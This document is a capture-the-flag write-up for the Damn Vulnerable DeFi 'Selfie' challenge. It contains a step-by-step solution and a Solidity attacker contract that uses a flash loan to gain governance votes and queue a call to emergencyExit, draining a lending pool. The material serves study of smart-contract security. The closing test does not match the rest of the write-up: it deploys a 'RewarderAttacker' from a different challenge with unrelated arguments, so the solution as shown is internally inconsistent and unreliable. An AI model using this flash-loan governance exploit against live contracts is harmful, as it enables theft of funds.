# #5 Selfie Damn Vulnerable Defi

## Goals

=> A new cool lending pool has launched! It’s now offering flash loans of DVT tokens. It even includes a fancy governance mechanism to control it.

=> What could go wrong, right ?

=> You start with no DVT tokens in balance, and the pool has 1.5 million. Your goal is to take them all.

### Hints

- None

### Solution

- Take a `flashLoan` for `maxFlashloan()` amount of tokens.

- When you receive the flashLoan we can take a snapshot to pass the `hasEnoughVotes()` check when calling the `queueAction()` function in the governance.

- Create a malicious `data` which will call `emergencyExit()` with the players address as input parameter

- Call `queueAction()` of governance with the address of the flashLoanPool as target address, value of 0 and our malicious data field from step 3

- Call `approve()` and aprove the flashLoan pool for the amount we just loaned from the pool so it can retrieve its tokens with `transferFrom()`

- Return the keccak256("ERC3156FlashBorrower.onFlashLoan") so the transactions passes in the flashLoanPool

- Wait 2 days so the 2 days threshold for executing is exceeded (evm_increaseTime in test)
- Call `executeAction` with the correct actionId

### Attacker Contract

```solidity
contract SelfieAttacker is IERC3156FlashBorrower {
    ISimpleGovernance governance;
    SelfiePool pool;
    DamnValuableTokenSnapshot snapToken;
    address immutable player;
    uint256 private actionId;

    constructor(address _governance, address _pool, address _token) {
        governance = ISimpleGovernance(_governance);
        pool = SelfiePool(_pool);
        snapToken = DamnValuableTokenSnapshot(_token);
        player = msg.sender;
    }

    function setAction() external {
        pool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(snapToken),
            pool.maxFlashLoan(address(snapToken)),
            "0x"
        );
    }

    function attack() external {
        governance.executeAction(actionId);
    }

    /**
     * @dev Receive a flash loan.
     * @param initiator The initiator of the loan.
     * @param token The loan currency.
     * @param amount The amount of tokens lent.
     * @param fee The additional amount of tokens to repay.
     * @param data Arbitrary data structure, intended to contain user-defined parameters.
     * @return The keccak256 hash of "ERC3156FlashBorrower.onFlashLoan"
     */
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        snapToken.snapshot();
        // malicious call data which will transfer all funds to our player
        bytes memory data = abi.encodeWithSignature(
            "emergencyExit(address)", // will transfer balance to player
            player // input var for emergencyExit
        );
        actionId = governance.queueAction(address(pool), 0, data);
        snapToken.approve(address(pool), snapToken.balanceOf(address(this)));
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
```

### Test

```javascript
it('Execution', async function () {
	await ethers.provider.send('evm_increaseTime', [5 * 24 * 60 * 60]); // 5 days
	const AttackerFactory = await ethers.getContractFactory('RewarderAttacker', deployer);
	const attacker = await AttackerFactory.deploy(
		rewardToken.address,
		flashLoanPool.address,
		rewarderPool.address,
		liquidityToken.address
	);
	const attackTx = await attacker.connect(player).attack();
	await attackTx.wait();
});
```
